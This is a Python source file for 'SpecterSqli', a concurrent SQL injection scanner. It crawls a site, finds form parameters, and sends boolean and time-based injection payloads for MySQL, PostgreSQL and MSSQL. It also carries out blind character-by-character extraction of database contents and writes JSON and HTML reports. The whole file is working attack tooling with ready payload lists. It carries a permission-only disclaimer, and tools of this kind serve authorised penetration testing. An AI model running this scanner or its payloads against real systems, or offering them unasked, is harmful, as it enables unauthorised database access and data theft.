#!/usr/bin/env python3
"""
SpecterSqli - concurrent SQLi scanner with discovery, timing, blind extraction,
HTML timing charts, JSON & cookie support, crawling (auto endpoint discovery), and comparison.

IMPORTANT: Use only on systems you own or have explicit permission to test.

Dependencies:
    pip3 install requests beautifulsoup4 matplotlib

Usage examples:
    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php
    python3 specter_sqli.py --targets-file endpoints.txt --concurrency --workers 8
    python3 specter_sqli.py --target http://10.0.2.15 --crawl --crawl-depth 2
    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --blind-extract "SELECT database()" --maxlen 20
    python3 specter_sqli.py --target http://10.0.2.15:5000/dashboard.php --cookies cookies.json

Sample endpoints.txt (one per line):
    http://10.0.2.15:5000/
    http://10.0.2.15:5000/login.php
    http://10.0.2.15:5000/search.php

Sample cookies.json:
    {
      "PHPSESSID": "9f2c91f72a8a4a3193f22fd8c9aa1234",
      "sessionid": "b6d81b360a5672d80c27430f39153e2c"
    }
"""

import argparse
import concurrent.futures
import json
import os
import re
import sys
import time
import traceback
import base64
import io
from urllib.parse import urlparse, urljoin, parse_qs

import requests
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt

# ---------- CONFIG ----------
DEFAULT_TIMEOUT = 6
DEFAULT_SLEEP = 4
DEFAULT_WORKERS = 6
LOGFILE_DEFAULT = "specter_results.json"
HTML_REPORT_DEFAULT = "specter_report.html"
USER_AGENT = "SpecterSqli/1.0"
# ---------- END CONFIG ----------

# Payloads and signatures
BOOLEAN_PAYLOADS = [
    ("Classic OR true", "alice' OR '1'='1' -- -"),
    ("Numeric OR true", "alice' OR 1=1 -- -"),
    ("Tautology double quote", "\" OR \"\" = \""),
]

TIME_PAYLOADS = [
    ("mysql", "alice' OR IF({COND}, SLEEP({N}), 0) -- -"),
    ("mysql", "alice' OR (SELECT IF({COND}, SLEEP({N}), 0)) -- -"),
    ("postgres", "alice' OR (SELECT CASE WHEN {COND} THEN pg_sleep({N}) ELSE pg_sleep(0) END) -- -"),
    ("mssql", "alice' ; IF ({COND}) WAITFOR DELAY '0:00:{N}' -- -"),
]

SQL_ERROR_REGEXES = [
    r"SQL syntax",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"ORA-",
    r"PG::",
    r"syntax error at or near",
    r"SQLSTATE",
    r"Warning: mysql_",
    r"Unhandled Exception",
]

# ---------- Helpers ----------
def timestamp():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def is_probably_json(text):
    try:
        json.loads(text)
        return True
    except Exception:
        return False

def contains_sql_error(text):
    if not text:
        return False
    for rx in SQL_ERROR_REGEXES:
        if re.search(rx, text, re.IGNORECASE):
            return True
    return False

# ---------- Network utils ----------
def normal_post(session, url, data=None, json_body=None, headers=None, timeout=DEFAULT_TIMEOUT, allow_redirects=True):
    kwargs = {"timeout": timeout, "allow_redirects": allow_redirects}
    if headers:
        kwargs["headers"] = headers
    if json_body is not None:
        return session.post(url, json=json_body, **kwargs)
    else:
        return session.post(url, data=data, **kwargs)

def baseline_request(session, url, timeout=DEFAULT_TIMEOUT, json_mode=False):
    try:
        t0 = time.time()
        if json_mode:
            r = normal_post(session, url, json_body={"username": "normaluser", "password": "normalpass"}, timeout=timeout)
        else:
            r = normal_post(session, url, data={"username": "normaluser", "password": "normalpass"}, timeout=timeout)
        dt = time.time() - t0
        return {
            "ok": True,
            "status": r.status_code,
            "length": len(r.text or ""),
            "time": dt,
            "sample": (r.text or "")[:200],
            "headers": dict(r.headers),
            "is_json": is_probably_json(r.text or "")
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ---------- Crawler for auto endpoint discovery ----------
def crawl_site(session, start_url, max_depth=2, timeout=6):
    """
    Simple site crawler (lab-safe):
     - crawls same-host links only
     - extracts <a href> and <form action>
    """
    visited = set()
    discovered = set()
    parsed_start = urlparse(start_url)
    start_host = parsed_start.netloc

    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return
        visited.add(url)
        try:
            r = session.get(url, timeout=timeout)
        except Exception:
            return
        discovered.add(url)
        soup = BeautifulSoup(r.text or "", "html.parser")
        # Links
        for a in soup.find_all("a", href=True):
            link = urljoin(url, a["href"])
            pl = urlparse(link)
            if pl.netloc == start_host:
                if pl.scheme in ("http", "https"):
                    crawl(link, depth + 1)
        # Form actions
        for form in soup.find_all("form"):
            action = form.get("action")
            if action:
                action_url = urljoin(url, action)
                pa = urlparse(action_url)
                if pa.netloc == start_host:
                    discovered.add(action_url)

    crawl(start_url, 0)
    return sorted(discovered)

# ---------- Discovery (forms & query params) ----------
def discover_params(session, url, timeout=DEFAULT_TIMEOUT):
    """
    Fetch page and parse forms for candidate parameter names.
    """
    try:
        r = session.get(url, timeout=timeout)
    except Exception as e:
        return {"error": str(e)}
    soup = BeautifulSoup(r.text or "", "html.parser")
    forms = []
    for form in soup.find_all("form"):
        form_action = form.get("action") or url
        method = (form.get("method") or "get").lower()
        inputs = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            typ = inp.get("type") or inp.name
            value = inp.get("value") or ""
            inputs[name] = {"type": typ, "value": value}
        forms.append({"action": urljoin(url, form_action), "method": method, "inputs": inputs})
    qparams = {}
    parsed = urlparse(url)
    if parsed.query:
        qparams = parse_qs(parsed.query)
    return {"forms": forms, "query_params": qparams, "page_sample": (r.text or "")[:500]}

# ---------- Boolean tests ----------
def run_boolean_tests(session, url, param_name_candidates, baseline, json_mode=False, timeout=DEFAULT_TIMEOUT):
    findings = []
    for pname in param_name_candidates:
        for desc, payload in BOOLEAN_PAYLOADS:
            if json_mode:
                data = {pname: payload, "password": "x"}
                headers = {"Content-Type": "application/json"}
                t0 = time.time()
                try:
                    r = normal_post(session, url, json_body=data, headers=headers, timeout=timeout)
                    dt = time.time() - t0
                except Exception as e:
                    findings.append({"param": pname, "payload": payload, "method": "json", "error": str(e)})
                    continue
            else:
                data = {pname: payload, "password": "x"}
                t0 = time.time()
                try:
                    r = normal_post(session, url, data=data, timeout=timeout)
                    dt = time.time() - t0
                except Exception as e:
                    findings.append({"param": pname, "payload": payload, "method": "form", "error": str(e)})
                    continue

            body = r.text or ""
            likely = False
            if contains_sql_error(body):
                likely = True
            if baseline.get("length") is not None and abs(len(body) - baseline["length"]) > max(20, 0.05 * baseline["length"]):
                likely = True
            for kw in ("welcome", "dashboard", "logout", "profile", "admin"):
                if kw in body.lower():
                    likely = True
            findings.append({
                "param": pname,
                "payload_desc": desc,
                "payload": payload,
                "method": "json" if json_mode else "form",
                "status": r.status_code,
                "length": len(body),
                "time": dt,
                "likely_success": likely,
                "sql_error": contains_sql_error(body)
            })
    return findings

# ---------- Time-based tests ----------
def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=DEFAULT_SLEEP, json_mode=False, timeout=DEFAULT_TIMEOUT):
    results = []
    for pname in param_name_candidates:
        for db, templ in TIME_PAYLOADS:
            try:
                payload_true = templ.format(COND="1=1", N=sleep_seconds)
                payload_false = templ.format(COND="1=0", N=sleep_seconds)
            except Exception:
                continue

            if json_mode:
                body_true = {pname: payload_true, "password": "x"}
                body_false = {pname: payload_false, "password": "x"}
                headers = {"Content-Type": "application/json"}
            else:
                body_true = {pname: payload_true, "password": "x"}
                body_false = {pname: payload_false, "password": "x"}
                headers = None

            # false first
            try:
                t0 = time.time()
                if json_mode:
                    r_false = normal_post(session, url, json_body=body_false, headers=headers, timeout=timeout)
                else:
                    r_false = normal_post(session, url, data=body_false, timeout=timeout)
                tf = time.time() - t0
            except Exception as e:
                results.append({"param": pname, "db": db, "error": f"false-request failed: {e}"})
                continue

            try:
                t0 = time.time()
                if json_mode:
                    r_true = normal_post(session, url, json_body=body_true, headers=headers, timeout=timeout + sleep_seconds + 2)
                else:
                    r_true = normal_post(session, url, data=body_true, timeout=timeout + sleep_seconds + 2)
                tt = time.time() - t0
            except Exception as e:
                results.append({"param": pname, "db": db, "error": f"true-request failed: {e}"})
                continue

            likely = (tt - tf) > (sleep_seconds * 0.6)
            results.append({
                "param": pname,
                "db": db,
                "true_time": tt,
                "false_time": tf,
                "baseline_time": baseline.get("time"),
                "likely_time_sqli": likely,
                "payload_true": payload_true[:500],
                "payload_false": payload_false[:500]
            })
    return results

# ---------- Blind per-character extraction ----------
def blind_extract(session, url, param, condition_template, charset=None, maxlen=32, sleep_seconds=1, json_mode=False, timeout=DEFAULT_TIMEOUT):
    """
    Very basic blind boolean/time extraction. Slow. Lab-only.
    condition_template must use placeholders {pos} and either {char} or {ascii}.
    E.g. "ASCII(SUBSTRING((SELECT database()),{pos},1))={ascii}"
    """
    if charset is None:
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}-.:/"

    found = ""
    for pos in range(1, maxlen + 1):
        matched_char = None
        for ch in charset:
            # Build condition
            cond = condition_template.format(pos=pos, char=ch, ascii=ord(ch))
            payload = f"alice' OR IF({cond}, SLEEP({sleep_seconds}), 0) -- -"
            try:
                if json_mode:
                    body = {param: payload, "password": "x"}
                    headers = {"Content-Type": "application/json"}
                    t0 = time.time()
                    r = normal_post(session, url, json_body=body, headers=headers, timeout=timeout + sleep_seconds + 2)
                    dt = time.time() - t0
                else:
                    body = {param: payload, "password": "x"}
                    t0 = time.time()
                    r = normal_post(session, url, data=body, timeout=timeout + sleep_seconds + 2)
                    dt = time.time() - t0
            except Exception as e:
                return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}

            if dt > (sleep_seconds * 0.6):
                matched_char = ch
                found += ch
                print(f"[+] pos {pos} -> '{ch}' (dt={dt:.2f}s)")
                break
        if not matched_char:
            print(f"[-] No match at position {pos}; stopping.")
            break
    return {"extracted": found}

# ---------- HTML report (timing chart) ----------
def make_timing_chart_png(timings, title="Response times"):
    labels = [t["label"] for t in timings]
    times = [t["time"] for t in timings]
    plt.figure(figsize=(max(6, len(labels) * 0.6), 4))
    plt.title(title)
    plt.xlabel("Test")
    plt.ylabel("Seconds")
    plt.grid(True, linestyle="--", linewidth=0.5)
    plt.plot(labels, times, marker="o")
    buf = io.BytesIO()
    plt.tight_layout()
    plt.savefig(buf, format="png")
    plt.close()
    buf.seek(0)
    return buf.read()

def build_html_report(results, outfile="specter_report.html"):
    def badge(text, level):
        colors = {"high": "red", "medium": "orange", "low": "green"}
        return f'<span style="color:white;background:{colors[level]};padding:4px 8px;border-radius:6px;">{text}</span>'

    html = f"""
<!DOCTYPE html>
<html>
<head>
<title>SpecterSqli Report</title>
<style>
body {{
    font-family: Arial, sans-serif;
    background: #0f172a;
    color: #e5e7eb;
    padding: 20px;
}}
h1, h2 {{ color: #38bdf8; }}
table {{
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 30px;
}}
th, td {{
    border: 1px solid #1e293b;
    padding: 8px;
}}
th {{ background: #1e293b; }}
tr:nth-child(even) {{ background: #020617; }}
code {{
    background: #020617;
    padding: 4px;
    border-radius: 4px;
}}
.footer {{
    margin-top: 40px;
    font-size: 13px;
    color: #94a3b8;
}}
</style>
</head>

<body>
<h1>👻 SpecterSqli Security Report</h1>
<p>Generated: {timestamp()}</p>

<h2>Boolean SQL Injection Findings</h2>
<table>
<tr><th>Parameter</th><th>Payload</th><th>Status</th><th>Risk</th></tr>
"""

    for f in results.get("boolean_findings", []):
        risk = badge("LIKELY", "high") if f.get("likely_success") else badge("No", "low")
        html += f"""
<tr>
<td>{f.get("param")}</td>
<td><code>{f.get("payload")}</code></td>
<td>{f.get("status")}</td>
<td>{risk}</td>
</tr>
"""

    html += """
</table>

<h2>Time-Based SQL Injection Findings</h2>
<table>
<tr><th>Param</th><th>DB</th><th>True Time</th><th>False Time</th><th>Vulnerable</th></tr>
"""

    for t in results.get("time_findings", []):
        risk = badge("YES", "high") if t.get("likely_time_sqli") else badge("NO", "low")
        html += f"""
<tr>
<td>{t.get("param")}</td>
<td>{t.get("db")}</td>
<td>{t.get("true_time"):.2f}s</td>
<td>{t.get("false_time"):.2f}s</td>
<td>{risk}</td>
</tr>
"""

    html += f"""
</table>

<h2>Blind Extraction Result</h2>
<pre>{json.dumps(results.get("blind"), indent=2)}</pre>

<div class="footer">
<hr>
<p>Tool: <b>SpecterSqli</b></p>
<p>Author: rhshourav</p>
<p>Educational & Lab Use Only</p>
</div>

</body>
</html>
"""

    with open(outfile, "w") as f:
        f.write(html)

    return outfile


# ---------- Orchestration per-target ----------
def analyze_target(url, opts):
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    out = {"url": url, "discovery": None, "baseline": None, "boolean_findings": [], "time_findings": [], "blind": None, "crawled_endpoints": None}

    # load cookies if provided
    if opts.cookies:
        if os.path.exists(opts.cookies):
            try:
                with open(opts.cookies, "r") as f:
                    ck = json.load(f)
                jar = requests.cookies.RequestsCookieJar()
                for k, v in ck.items():
                    jar.set(k, v)
                session.cookies = jar
            except Exception as e:
                out["cookie_error"] = str(e)

    json_mode = bool(opts.json) or url.lower().endswith(".json")

    # optional crawling (if target is site root and user requested)
    if opts.crawl and opts.crawl_depth >= 0:
        try:
            crawled = crawl_site(session, url, max_depth=opts.crawl_depth, timeout=opts.timeout)
            out["crawled_endpoints"] = crawled
        except Exception as e:
            out["crawled_error"] = str(e)

    # Discovery (forms & query params)
    disc = discover_params(session, url, timeout=opts.timeout)
    out["discovery"] = disc

    # Build candidate parameter list
    candidates = set()
    for n in ("username", "user", "u", "email", "login", "password", "pass", "q", "search"):
        candidates.add(n)
    if isinstance(disc, dict):
        for f in disc.get("forms", []) or []:
            for name in f.get("inputs", {}).keys():
                candidates.add(name)
        for qp in disc.get("query_params", {}).keys():
            candidates.add(qp)
    candidates = sorted(list(candidates))
    out["candidates"] = candidates

    # Baseline
    base = baseline_request(session, url, timeout=opts.timeout, json_mode=json_mode)
    out["baseline"] = base
    if not base.get("ok", True):
        return out

    # Boolean tests
    boolean = run_boolean_tests(session, url, candidates, base, json_mode=json_mode, timeout=opts.timeout)
    out["boolean_findings"] = boolean

    # Time tests
    time_f = run_time_tests(session, url, candidates, base, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
    out["time_findings"] = time_f

    # Blind extraction
    if opts.blind_extract:
        cond_template = opts.condition_template or opts.blind_extract_condition or "ASCII(SUBSTRING(({expr}),{pos},1))={ascii}"
        expr = opts.blind_extract
        if "{expr}" in cond_template:
            cond_template = cond_template.replace("{expr}", expr)
        param_for_blind = opts.blind_param or (candidates[0] if candidates else "username")
        b = blind_extract(session, url, param_for_blind, cond_template, charset=opts.charset, maxlen=opts.maxlen, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
        out["blind"] = b

    return out

# ---------- CLI ----------
def parse_args():
    p = argparse.ArgumentParser(prog="SpecterSqli", description="Concurrent SQLi scanner with discovery, timing, blind extraction, JSON & cookie support.")
    p.add_argument("--target", help="Single target URL (e.g. http://10.0.2.15:5000/login.php)", default=None)
    p.add_argument("--targets-file", help="File containing one target URL per line", default=None)
    p.add_argument("--compare", help="Optional second target URL to compare against", default=None)
    p.add_argument("--concurrency", help="Scan multiple endpoints concurrently from targets-file", action="store_true")
    p.add_argument("--workers", help="Max worker threads (default 6)", type=int, default=DEFAULT_WORKERS)
    p.add_argument("--timeout", help="Request timeout seconds", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--sleep", help="Seconds for time-based payloads", type=int, default=DEFAULT_SLEEP)
    p.add_argument("--json", help="Treat endpoint as JSON API (send JSON bodies)", action="store_true")
    p.add_argument("--cookies", help="Path to JSON file with cookies to load (key->value)", default=None)
    p.add_argument("--blind-extract", help="Run blind-extract: provide SQL expression to extract (e.g. 'SELECT database()')", default=None)
    p.add_argument("--blind-param", help="Parameter name to use for blind extraction (default: discovered candidate)", default=None)
    p.add_argument("--condition-template", help="Condition template using {pos} {char} {ascii} or {expr}", default=None)
    p.add_argument("--charset", help="Charset for blind extraction", default=None)
    p.add_argument("--maxlen", help="Max length to extract in blind extraction", type=int, default=32)
    p.add_argument("--output", help="JSON output filename", default=LOGFILE_DEFAULT)
    p.add_argument("--report", help="HTML report filename", default=HTML_REPORT_DEFAULT)
    p.add_argument("--quiet", help="Less console output", action="store_true")
    p.add_argument("--crawl", help="Automatically crawl site to discover endpoints", action="store_true")
    p.add_argument("--crawl-depth", help="Crawler depth (default 2)", type=int, default=2)
    return p.parse_args()

def main():
    opts = parse_args()

    targets = []
    if opts.targets_file:
        if not os.path.exists(opts.targets_file):
            print("[!] targets file not found:", opts.targets_file)
            sys.exit(1)
        with open(opts.targets_file, "r") as f:
            for line in f:
                s = line.strip()
                if s:
                    targets.append(s)
    if opts.target:
        targets.append(opts.target)

    if not targets:
        print("[!] No targets specified. Use --target or --targets-file.")
        sys.exit(1)

    results = []
    start = time.time()

    # If crawling requested and single target provided, derive endpoints from crawling
    if opts.crawl and opts.target:
        if not opts.quiet:
            print("[*] Crawling target for endpoints (this may take a bit)...")
        tmp_session = requests.Session()
        tmp_session.headers.update({"User-Agent": USER_AGENT})
        try:
            crawled = crawl_site(tmp_session, opts.target, max_depth=opts.crawl_depth, timeout=opts.timeout)
            if crawled:
                targets = crawled  # override targets with discovered endpoints
                if not opts.quiet:
                    print(f"[+] Discovered {len(crawled)} endpoints via crawl")
        except Exception as e:
            if not opts.quiet:
                print("[!] Crawl failed:", e)

    # concurrent scanning if requested and multiple targets
    if opts.concurrency and len(targets) > 1:
        if not opts.quiet:
            print(f"[*] Running in concurrent mode with {opts.workers} workers on {len(targets)} targets")
        with concurrent.futures.ThreadPoolExecutor(max_workers=opts.workers) as ex:
            futs = {ex.submit(analyze_target, t, opts): t for t in targets}
            for fut in concurrent.futures.as_completed(futs):
                t = futs[fut]
                try:
                    res = fut.result()
                except Exception as e:
                    res = {"url": t, "error": str(e), "trace": traceback.format_exc()}
                results.append(res)
                if not opts.quiet:
                    print(f"[+] Completed: {t}")
    else:
        for t in targets:
            if not opts.quiet:
                print(f"[*] Scanning: {t}")
            try:
                res = analyze_target(t, opts)
            except Exception as e:
                res = {"url": t, "error": str(e), "trace": traceback.format_exc()}
            results.append(res)

    # Comparison mode (optional)
    compare_results = None
    if opts.compare:
        if not opts.quiet:
            print("[*] Running comparison between primary target and compare target")
        try:
            a = analyze_target(targets[0], opts)
            b = analyze_target(opts.compare, opts)
            compare_results = {"A": a, "B": b}
        except Exception as e:
            compare_results = {"error": str(e)}

    out = {"generated": timestamp(), "targets": targets, "results": results, "compare": compare_results}
    with open(opts.output, "w") as f:
        json.dump(out, f, indent=2)
    print(f"[+] Results saved to {opts.output}")

    # Build HTML report from first result (if present)
    primary = results[0] if results else {}
    html_in = {
        "boolean_findings": primary.get("boolean_findings"),
        "time_findings": primary.get("time_findings"),
        "blind": primary.get("blind")
    }
    try:
        rpt = build_html_report(html_in, outfile=opts.report)
        print(f"[+] HTML report written to {rpt}")
    except Exception as e:
        print("[!] Failed to build HTML report:", e)

    elapsed = time.time() - start
    print(f"[*] Done in {elapsed:.1f}s")

if __name__ == "__main__":
    main()
